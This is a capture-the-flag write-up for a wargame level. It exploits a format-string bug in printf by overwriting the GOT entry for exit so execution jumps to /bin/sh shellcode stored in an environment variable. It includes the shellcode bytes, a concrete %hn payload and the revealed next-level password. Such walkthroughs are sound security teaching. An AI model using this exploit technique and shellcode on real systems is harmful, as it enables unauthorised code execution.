## Level05

## Binary Analysis

`level05` contains a format-string vulnerability: user-controlled input is passed directly to `printf()` without a format specifier, enabling both arbitrary reads and writes via `%x`, `%p`, and `%n`/`%hn`.

## Vulnerability

Key points from the program behavior:

- The program reads input into a buffer, manipulates characters (uppercase -> lowercase), then calls `printf(buffer)` (vulnerable).
- After `printf` it calls `exit(0)`, so overwriting the stack return address is ineffective for gaining control. Instead, overwriting a GOT entry (e.g., `exit`) is the reliable approach.

## Exploitation Strategy

1. Place shellcode in an environment variable (large NOP sled + shellcode) so you have a predictable target address.

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

2. Use a helper to find the environment address (example helper shown earlier).

3. Identify the stack argument index where your controlled data appears (e.g., using `%x` and `AAAA` pattern). In the original notes, `AAAA` appeared at stack position 10.

4. Overwrite the GOT entry for `exit` (e.g., `0x080497e0`) with the address of the environment shellcode. Use `%hn` to perform two 2-byte writes (lower and upper halves) and carefully craft padding to reach the desired write values.

Example structure (conceptual):

```
[address_low][address_high][padding_for_low_adjustment]%10$hn[padding_for_high_adjustment]%11$hn
```

5. Trigger `exit(0)` and the process will jump to the overwritten GOT entry (your shellcode address).

## Example (high-level)

```bash
# Addresses and padding depend on your run-time discovery
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%55308x%10$hn%10219x%11$hn"'; cat) | ./level05

cat /home/users/level06/.pass
```

Adjust the numbers and addresses to match the environment of the target run.

## Key Takeaways

- Format string vulnerabilities allow arbitrary memory writes using `%n`/`%hn`.
- GOT overwrites are a reliable way to gain code execution when stack return addresses aren't usable.
- Environment-placed shellcode + NOP sleds improve reliability across runs.

## Result

Password for level06: `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
